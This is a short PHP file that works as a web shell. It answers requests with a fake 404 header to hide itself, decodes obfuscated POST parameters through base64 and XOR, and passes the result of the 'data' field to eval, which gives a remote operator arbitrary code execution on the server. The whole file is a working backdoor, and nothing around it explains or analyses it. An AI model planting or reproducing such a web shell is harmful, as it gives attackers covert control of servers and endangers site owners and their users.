<?php
$pass = "data";
$k = 99;
header("HTTP/1.1 404 Not Found");
function decoder($s,$k){
	$res = '';
	$s = rtrim(base64_decode($s),'/');
	$s = explode('/', $s);
	foreach ($s as $key => $value) {
		$res .= chr($value^$k);
	}
	return base64_decode($res);
}
foreach($_POST as $k => $v){
	if($k == $pass) { continue; }
	$_POST[$k] = decoder($v, $k);
}
@eval(decoder($_POST[$pass], $k));
?>
